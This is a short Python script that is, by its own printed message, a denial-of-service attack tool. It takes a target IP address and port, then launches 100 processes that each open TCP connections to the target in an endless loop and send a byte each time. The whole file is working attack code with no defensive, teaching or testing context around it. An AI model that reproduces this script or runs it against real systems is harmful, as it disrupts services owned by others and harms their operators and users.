import socket
from time import sleep
import sys
from multiprocessing import Pool, Process


def make_dos(ip,port):
    while True:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            try:
                s.connect((ip,port))
                s.send(bytes(1))
            except:
                pass
        sleep(0.1)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = int(sys.argv[2])
    for i in range(100):
        p = Process(target=make_dos,args=(ip,port))
        p.start()
    print(f'DOS attack to {ip,port} was started')
    input()
    


        
